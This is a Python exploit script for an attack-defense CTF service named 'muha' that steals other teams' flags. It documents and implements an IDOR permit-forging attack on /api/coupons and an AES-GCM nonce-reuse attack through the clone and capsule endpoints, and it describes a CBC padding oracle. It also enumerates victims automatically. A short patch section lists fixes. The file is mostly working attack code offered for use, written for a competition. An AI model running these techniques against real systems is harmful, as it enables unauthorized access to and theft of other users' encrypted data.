"""Exploit for the muha service (Flask + SQLite, "ферма мух") — steals a memory's
plaintext (= the flag) from another team's box.

The checker stores the flag as the `content` of a "memory". A memory is encrypted
two ways at rest: AES-256-GCM under the fly's per-fly `brain_key` (the `ciphertext`),
and AES-CBC under a process-wide shared `archive_key` (the `archive`). muha ships
with several object-level-authz holes; teams patch them unevenly, so this exploit
tries three independent paths and stops at the first that yields the flag. `flag_id`
is the victim memory id (`mid`) from attack-data; with no id we enumerate public
flies -> their memory ids and dump everything.

PATH A — permit IDOR on /api/coupons (confused deputy / BOLA)
    Unpatched /api/coupons signs an HMAC read-permit for ANY `object_id` the client
    names, without checking the object belongs to the caller. /api/memories/<mid>/read
    accepts a permit whose subject==caller & object_id==mid and decrypts server-side.
        register -> create own fly -> POST /api/coupons {fly_id:own, object_id:victim mid}
        -> POST /api/memories/<victim mid>/read {token} -> plaintext flag
    3 requests, no crypto. Dead once coupons verifies object ownership (403).

PATH B — AES-GCM nonce reuse via /api/flies/<fid>/clone + /api/memories/<mid>/capsule
    The GCM nonce is the fly's `counter` (nonce = counter.to_bytes(12)); the counter
    resets to any chosen `revision` on clone, and clone copies the victim's brain_key
    into a fly WE own without an owner check. capsule() hands out any memory's raw
    ciphertext+nonce without an owner check. So:
        capsule(victim mid) -> victim nonce N (=counter) and ciphertext C2
        clone(victim fly, revision=N) -> our fly, same brain_key, counter=N
        store a known P1 on the clone -> capsule(ours) -> ciphertext C1 at the SAME (key,N)
        keystream KS = P1 ^ C1  ;  victim plaintext = C2 ^ KS       (many-time-pad)
    ~5 requests + XOR. Works whenever capsule and clone both skip the owner check,
    independent of whether coupons is patched.

PATH C — CBC padding oracle on /api/archives/preview (NOT wired; slow)
    capsule() also returns the CBC `archive` blob (shared archive_key); preview()
    answers 422 only on bad PKCS7 padding, a classic padding oracle that recovers the
    archive plaintext (which contains the flag) without the key. It needs hundreds of
    sequential requests per block, so it would blow the farm's per-call budget and get
    the exploit quarantined — left out here; run it from a dedicated long-timeout
    runner if both capsule is open AND clone is patched.

Patch (defense, see defense/muha_idor.md): in /api/coupons verify the object belongs
to the caller BEFORE signing (bind the permit to subject+expiry too); add an owner
check to /api/memories/<mid>/capsule; and use a fresh random GCM nonce per memory
(never the counter) so clone can't force a nonce collision.

Interface: exploit(host, port, flag_id) -> list[str]   # flag_id = victim memory id
Deps: requests (stdlib base64/re otherwise).
"""
import base64
import json
import random
import re
import string
import sys

import requests

FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
TIMEOUT = 6
MAX_ENUM = 100                     # cap mids dumped per round when no flag_id is given

# One registered session per box (survives the game; a box restart wipes it -> we
# detect the dead session via /api/me and re-register). Caches our own fly id too,
# which Path A needs to mint a coupon.
_SESS = {}


def _rand(n=10):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _unb64(value):
    # capsule encodes with urlsafe-b64 and strips '=' padding; put it back to decode.
    if not isinstance(value, str):
        return b""
    try:
        return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))
    except (ValueError, base64.binascii.Error):
        return b""


def _scan(*values):
    out = []
    for v in values:
        if v:
            out.extend(FLAG_RE.findall(str(v)))
    return out


def _register(base):
    s = requests.Session()
    for _ in range(2):                         # retry once on the rare username clash
        try:
            r = s.post(base + "/api/register",
                       json={"username": "lab" + _rand(10), "password": _rand(16)},
                       timeout=TIMEOUT)
        except requests.RequestException:
            return None, None
        if r.status_code in (200, 201):
            fid = None
            try:                               # our own fly: Path A coupons needs fly_id==ours
                rf = s.post(base + "/api/flies",
                            json={"name": "n" + _rand(6), "profession": "p" + _rand(6)},
                            timeout=TIMEOUT)
                if rf.status_code in (200, 201):
                    fid = rf.json().get("id")
            except (ValueError, requests.RequestException):
                pass
            return s, fid
    return None, None


def _session(base, force=False):
    if not force:
        cached = _SESS.get(base)
        if cached:
            try:
                if cached["s"].get(base + "/api/me", timeout=TIMEOUT).status_code == 200:
                    return cached["s"], cached["fid"]
            except requests.RequestException:
                pass
    s, fid = _register(base)
    if s is not None:
        _SESS[base] = {"s": s, "fid": fid}
    else:
        _SESS.pop(base, None)
    return s, fid


def _mid_from_flag_id(flag_id):
    """Live attack-data hands flag_id as a JSON string {"fly_id": "...",
    "memory_id": "..."}; the memory endpoints key on the memory id. Return that mid.
    Tolerate a bare id string (manual runs / older format) and a dict too."""
    if flag_id is None:
        return None
    obj = flag_id
    if isinstance(flag_id, str):
        s = flag_id.strip()
        if not s:
            return None
        if s[0] != "{":
            return s                       # already a bare mid
        try:
            obj = json.loads(s)
        except ValueError:
            return s
    if isinstance(obj, dict):
        mid = obj.get("memory_id") or obj.get("mid") or obj.get("id")
        return str(mid).strip() if mid else None
    return str(obj).strip() or None


def _targets(s, base, flag_id):
    if flag_id is not None:
        mid = _mid_from_flag_id(flag_id)
        return [mid] if mid else []
    # no id -> enumerate: public flies, then each fly's memory ids (neither endpoint
    # checks ownership), and dump them all.
    mids = []
    try:
        flies = s.get(base + "/api/flies", params={"scope": "public"},
                      timeout=TIMEOUT).json().get("flies", [])
    except (ValueError, requests.RequestException):
        flies = []
    for fl in flies:
        if not isinstance(fl, dict) or not fl.get("id"):
            continue
        try:
            mems = s.get(base + "/api/flies/%s/memories" % fl["id"],
                         timeout=TIMEOUT).json().get("memories", [])
        except (ValueError, requests.RequestException):
            continue
        for mm in mems:
            if isinstance(mm, dict) and mm.get("id"):
                mids.append(mm["id"])
        if len(mids) >= MAX_ENUM:
            break
    return mids[:MAX_ENUM]


def _via_coupon(s, base, our_fid, mid):
    """Path A: forge a read-permit for someone else's memory and redeem it."""
    if not our_fid:
        return []
    try:
        r = s.post(base + "/api/coupons",
                   json={"fly_id": our_fid, "object_id": mid}, timeout=TIMEOUT)
        if r.status_code != 200:               # 403 == coupons patched to verify ownership
            return []
        token = r.json().get("token")
        if not token:
            return []
        r = s.post(base + "/api/memories/%s/read" % mid,
                   json={"token": token}, timeout=TIMEOUT)
        if r.status_code != 200:
            return []
        j = r.json()
        return _scan(j.get("content"), j.get("title"))
    except (ValueError, requests.RequestException):
        return []


def _via_clone(s, base, mid):
    """Path B: clone the victim's brain_key, force a nonce collision, recover keystream."""
    try:
        r = s.get(base + "/api/memories/%s/capsule" % mid, timeout=TIMEOUT)
        if r.status_code != 200:               # 403 == capsule patched to verify ownership
            return []
        cap = r.json()
        victim_fid = cap.get("fly_id")
        c2 = _unb64(cap.get("ciphertext"))
        n = int.from_bytes(_unb64(cap.get("nonce")), "big")
        length = len(c2)
        if not victim_fid or not (1 <= length <= 4096):
            return []

        r = s.post(base + "/api/flies/%s/clone" % victim_fid,
                   json={"name": "c" + _rand(6), "revision": n}, timeout=TIMEOUT)
        if r.status_code not in (200, 201):
            return []
        clone_id = r.json().get("id")
        if not clone_id:
            return []

        p1 = "A" * length                      # known plaintext, length-matched to the victim's
        r = s.post(base + "/api/flies/%s/memories" % clone_id,
                   json={"title": "t", "content": p1}, timeout=TIMEOUT)
        if r.status_code not in (200, 201):
            return []
        our_mid = r.json().get("id")
        if not our_mid:
            return []

        r = s.get(base + "/api/memories/%s/capsule" % our_mid, timeout=TIMEOUT)
        if r.status_code != 200:
            return []
        c1 = _unb64(r.json().get("ciphertext"))
        if len(c1) < length:
            return []
        p1b = p1.encode()
        ks = bytes(a ^ b for a, b in zip(p1b, c1))         # keystream at (brain_key, nonce=n)
        pt = bytes(a ^ b for a, b in zip(c2, ks))          # victim plaintext
        return _scan(pt.decode("utf-8", "ignore"))
    except (ValueError, KeyError, requests.RequestException):
        return []


def _steal_one(s, base, our_fid, mid):
    return _via_coupon(s, base, our_fid, mid) or _via_clone(s, base, mid)


def exploit(host, port, flag_id):
    flags, seen = [], set()
    try:
        base = "http://%s:%s" % (host, port)   # %s: a non-int port returns [] instead of raising
        s, our_fid = _session(base)
        if s is None:
            return flags
        mids = _targets(s, base, flag_id)
        # if a cached session went stale mid-game (box restart), /api/me in _session
        # already re-registered; but if enumeration came back empty with a cached
        # session, re-register once and retry (cheap, self-healing).
        if not mids and flag_id is None and _SESS.get(base):
            s, our_fid = _session(base, force=True)
            if s is not None:
                mids = _targets(s, base, flag_id)
        for mid in mids:
            for f in _steal_one(s, base, our_fid, mid):
                if f not in seen:
                    seen.add(f)
                    flags.append(f)
    except Exception:
        return flags
    return flags


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    p = int(sys.argv[2]) if len(sys.argv) > 2 else 8000
    fid = sys.argv[3] if len(sys.argv) > 3 else None
    for f in exploit(h, p, fid):
        print(f)
